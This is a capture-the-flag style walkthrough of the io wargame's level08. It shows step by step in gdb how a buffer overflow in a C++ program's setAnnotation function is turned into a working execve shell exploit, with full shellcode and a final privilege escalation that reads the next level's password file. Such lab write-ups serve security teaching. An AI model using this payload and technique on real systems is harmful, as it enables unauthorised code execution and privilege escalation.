Read the source code for this level in level08.cpp

We have a class named Number and a function called setAnnotation. It looks like our goal is to overflow the annotation buffer using the setAnnotation function. argv[1] is passed directly into the function without checking its size. Let's just try simply overflowing the buffer.
```
level8@io:/levels$ gdb -q ./level08
Reading symbols from /levels/level08...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) display/10i $eip
(gdb) run $(python -c 'print "A"*200')
Starting program: /levels/level08 $(python -c 'print "A"*200')

Program received signal SIGSEGV, Segmentation fault.
0x08048726 in main ()
1: x/10i $eip
=> 0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
   0x804873f <main+171>:    pop    ebp
(gdb) i r
eax            0x41414141    1094795585
ecx            0x0   0
edx            0x0   0
ebx            0x804a078 134520952
esp            0xbffffbb0    0xbffffbb0
ebp            0xbffffbe8    0xbffffbe8
esi            0x0   0
edi            0x0   0
eip            0x8048726 0x8048726 <main+146>
eflags         0x10246   [ PF ZF IF RF ]
cs             0x73  115
ss             0x7b  123
ds             0x7b  123
es             0x7b  123
fs             0x0   0
gs             0x33  51
```

We're not overwriting eip but our data ends up in eax. And we get a seg fault because we're trying to deref eax and 0x41414141 is not a valid address. So we just need to find the offset at which we overwrite eip. First, let's look at the disassembly leading up to this crash.
```
(gdb) disas main
Dump of assembler code for function main:
   0x08048694 <+0>:     push   ebp
   0x08048695 <+1>:     mov    ebp,esp
   0x08048697 <+3>:     and    esp,0xfffffff0
   0x0804869a <+6>:     push   ebx
   0x0804869b <+7>:     sub    esp,0x2c

... snip ...

   0x08048720 <+140>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048724 <+144>:   mov    eax,DWORD PTR [eax]
=> 0x08048726 <+146>:   mov    edx,DWORD PTR [eax]
   0x08048728 <+148>:   mov    eax,DWORD PTR [esp+0x18]
   0x0804872c <+152>:   mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+156>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048734 <+160>:   mov    DWORD PTR [esp],eax
   0x08048737 <+163>:   call   edx
```

We're deref'ing a pointer off the stack and storing the result in eax, deref'ing eax once and storing the result back in eax, then deref'ing it again and storing it edx. A few instructions down we then call edx, so we can control where we jump. We need to successfully pass the first deref and then make the second deref set up edx to jump to our shellcode. So we need to know the offset, control the first deref, and make it so the second deref points to our shellcode. Let's find the offset first.
```
[1]+  Stopped                 gdb -q ./level08
level8@io:/levels$ python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import random
>>> s = ''.join([chr(random.randint(0x41,0x5a)) for x in xrange(200)])
>>> s
'VDZAPGRSNYWQFPLJRRMHHWERMMJYMVCMUTQCMLARCFGUNYOXOZWNDQMJBEGXQQYEVDNCRMUFFQLMVOTXMKIRUOBXOWLYKMLHLCCALEHHIJXSNRTYBDCSIRCEZXDIQBUHLOYPXNUILUDIBFHMMQXJXHADDXBNGXWOKLXOUBRWRDBFKCRAXMFIJTWXJIPSNUBBHFDZEWIG'
>>> 
[2]+  Stopped                 python
level8@io:/levels$ fg 1
gdb -q ./level08
BXOWLYKMLHLCCALEHHIJXSNRTYBDCSIRCEZXDIQBUHLOYPXNUILUDIBFHMMQXJXHADDXBNGXWOKLXOUBRWRDBFKCRAXMFIJTWXJIPSNUBBHFDZEWIG
Starting program: /levels/level08 VDZAPGRSNYWQFPLJRRMHHWERMMJYMVCMUTQCMLARCFGUNYOXOZWNDQMJBEGXQQYEVDNCRMUFFQLMVOTXMKIRUOBXOWLYKMLHLCCALEHHIJXSNRTYBDCSIRCEZXDIQBUHLOYPXNUILUDIBFHMMQXJXHADDXBNGXWOKLXOUBRWRDBFKCRAXMFIJTWXJIPSNUBBHFDZEWIG

Program received signal SIGSEGV, Segmentation fault.
0x08048726 in main ()
1: x/10i $eip
=> 0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
   0x804873f <main+171>:    pop    ebp
(gdb) i r
eax            0x5954524e    1498698318
ecx            0x0   0
edx            0x0   0
ebx            0x804a078 134520952
esp            0xbffffbb0    0xbffffbb0
ebp            0xbffffbe8    0xbffffbe8
esi            0x0   0
edi            0x0   0
eip            0x8048726 0x8048726 <main+146>
eflags         0x10246   [ PF ZF IF RF ]
cs             0x73  115
ss             0x7b  123
ds             0x7b  123
es             0x7b  123
fs             0x0   0
gs             0x33  51
(gdb) ^Z
[1]+  Stopped                 gdb -q ./level08
level8@io:/levels$ fg 2
python


>>> s.index("\x4e\x52\x54\x59")
108
```

So our target offset is 108 bytes. Let's look at our buffer in memory.
```
(gdb) break *0x08048720
Breakpoint 1 at 0x8048720
(gdb) run $(python -c 'print "A"*108 + "BBBB" + "C"*100')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level08 $(python -c 'print "A"*108 + "BBBB" + "C"*100')

Breakpoint 1, 0x08048720 in main ()
1: x/10i $eip
=> 0x8048720 <main+140>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048724 <main+144>:    mov    eax,DWORD PTR [eax]
   0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
(gdb) ni
0x08048724 in main ()
1: x/10i $eip
=> 0x8048724 <main+144>:    mov    eax,DWORD PTR [eax]
   0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
(gdb) x/20xw $eax
0x804a078:    0x42424242  0x43434343  0x43434343  0x43434343
0x804a088:    0x43434343  0x43434343  0x43434343  0x43434343
0x804a098:    0x43434343  0x43434343  0x43434343  0x43434343
0x804a0a8:    0x43434343  0x43434343  0x43434343  0x43434343
0x804a0b8:    0x43434343  0x43434343  0x43434343  0x43434343
```

So we're about to deref 0x42424242. We should make it deref eax+4 (0x804a07c) so that eax ends up pointing to 0x43434343. Then we can replace those four Cs with eax+8 (0x804a080). And we can have our shellcode follow right afterwards because these addresses are static. Let's replace those eight bytes and see how it works out.
```
(gdb) run $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "C"*100')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level08 $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "C"*100')

Breakpoint 1, 0x08048720 in main ()
1: x/10i $eip
=> 0x8048720 <main+140>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048724 <main+144>:    mov    eax,DWORD PTR [eax]
   0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
(gdb) ni
0x08048724 in main ()
1: x/10i $eip
=> 0x8048724 <main+144>:    mov    eax,DWORD PTR [eax]
   0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
(gdb) x/20xw $eax
0x804a078:    0x0804a07c  0x0804a080  0x43434343  0x43434343
0x804a088:    0x43434343  0x43434343  0x43434343  0x43434343
0x804a098:    0x43434343  0x43434343  0x43434343  0x43434343
0x804a0a8:    0x43434343  0x43434343  0x43434343  0x43434343
0x804a0b8:    0x43434343  0x43434343  0x43434343  0x43434343
(gdb) ni
0x08048726 in main ()
1: x/10i $eip
=> 0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
   0x804873f <main+171>:    pop    ebp
(gdb) x/20xw $eax
0x804a07c: 0x0804a080  0x43434343  0x43434343  0x43434343
0x804a08c: 0x43434343  0x43434343  0x43434343  0x43434343
0x804a09c: 0x43434343  0x43434343  0x43434343  0x43434343
0x804a0ac: 0x43434343  0x43434343  0x43434343  0x43434343
0x804a0bc: 0x43434343  0x43434343  0x43434343  0x43434343
(gdb) ni
0x08048728 in main ()
1: x/10i $eip
=> 0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
   0x804873f <main+171>:    pop    ebp
   0x8048740 <main+172>:    ret    
(gdb) x/20xw $eax
0x804a07c:  0x0804a080  0x43434343  0x43434343  0x43434343
0x804a08c:  0x43434343  0x43434343  0x43434343  0x43434343
0x804a09c:  0x43434343  0x43434343  0x43434343  0x43434343
0x804a0ac:  0x43434343  0x43434343  0x43434343  0x43434343
0x804a0bc:  0x43434343  0x43434343  0x43434343  0x43434343
(gdb) i r
eax            0x804a07c    134520956
ecx            0x0  0
edx            0x804a080    134520960
ebx            0x804a078    134520952
esp            0xbffffba0   0xbffffba0
ebp            0xbffffbd8   0xbffffbd8
esi            0x0  0
edi            0x0  0
eip            0x8048728    0x8048728 <main+148>
eflags         0x246    [ PF ZF IF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0  0
gs             0x33 51
(gdb) x/s $edx
0x804a080:   'C' <repeats 100 times>, "!\017\002"
```

So now edx points to our buffer. Let's throw our shellcode following those two addresses in our buffer.
```
(gdb) run $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level08 $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x08048720 in main ()
1: x/10i $eip
=> 0x8048720 <main+140>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048724 <main+144>:    mov    eax,DWORD PTR [eax]
   0x8048726 <main+146>:    mov    edx,DWORD PTR [eax]
   0x8048728 <main+148>:    mov    eax,DWORD PTR [esp+0x18]
   0x804872c <main+152>:    mov    DWORD PTR [esp+0x4],eax
   0x8048730 <main+156>:    mov    eax,DWORD PTR [esp+0x1c]
   0x8048734 <main+160>:    mov    DWORD PTR [esp],eax
   0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
(gdb) ni

... skip a few instructions up to "call edx" ...

0x08048737 in main ()
1: x/10i $eip
=> 0x8048737 <main+163>:    call   edx
   0x8048739 <main+165>:    add    esp,0x2c
   0x804873c <main+168>:    pop    ebx
   0x804873d <main+169>:    mov    esp,ebp
   0x804873f <main+171>:    pop    ebp
   0x8048740 <main+172>:    ret    
   0x8048741 <_Z41__static_initialization_and_destruction_0ii>:     push   ebp
   0x8048742 <_Z41__static_initialization_and_destruction_0ii+1>:   mov    ebp,esp
   0x8048744 <_Z41__static_initialization_and_destruction_0ii+3>:   sub    esp,0x18
   0x8048747 <_Z41__static_initialization_and_destruction_0ii+6>:   cmp    DWORD PTR [ebp+0x8],0x1
(gdb) 
0x0804a080 in ?? ()
1: x/10i $eip
=> 0x804a080:   xor    eax,eax
   0x804a082:   push   eax
   0x804a083:   push   0x68732f2f
   0x804a088:   push   0x6e69622f
   0x804a08d:   mov    ebx,esp
   0x804a08f:   push   eax
   0x804a090:   push   ebx
   0x804a091:   mov    ecx,esp
   0x804a093:   mov    al,0xb
   0x804a095:   int    0x80
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0804a097 in ?? ()
1: x/10i $eip
=> 0x804a097:   add    BYTE PTR [eax],al
   0x804a099:   add    BYTE PTR [eax],al
   0x804a09b:   add    BYTE PTR [eax],al
   0x804a09d:   add    BYTE PTR [eax],al
   0x804a09f:   add    BYTE PTR [eax],al
   0x804a0a1:   add    BYTE PTR [eax],al
   0x804a0a3:   add    BYTE PTR [eax],al
   0x804a0a5:   add    BYTE PTR [eax],al
   0x804a0a7:   add    BYTE PTR [eax],al
   0x804a0a9:   add    BYTE PTR [eax],al
```

Our shellcode ran but we didn't get a shell... instead we got a seg fault again. Well to save some space and time (because this isn't a shellcode walkthrough), our shellcode doesn't zero out edx. So when it makes our execve syscall, edx (being treated as the third argument of execve: char *envp[]) causes the syscall to fail because that's not a valid pointer and trying to deref it causes an exception. To fix the issue, add these two bytes to the start of the shellcode: "\x33\xd2". These are the bytes for the `xor edx, edx` instruction. When we add this, this is the result.
```
level8@io:/levels$ gdb -q ./level08
Reading symbols from /levels/level08...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) display/10i $eip
(gdb) run $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
Starting program: /levels/level08 $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
process 2008 is executing new program: /bin/bash
sh-4.2$ 
```

Now let's run it outside of the debugger.
```
level8@io:/levels$ ./level08 $(python -c 'print "A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
sh-4.2$ whoami
level9
sh-4.2$ cat /home/level9/.pass
[Password for level9]
```
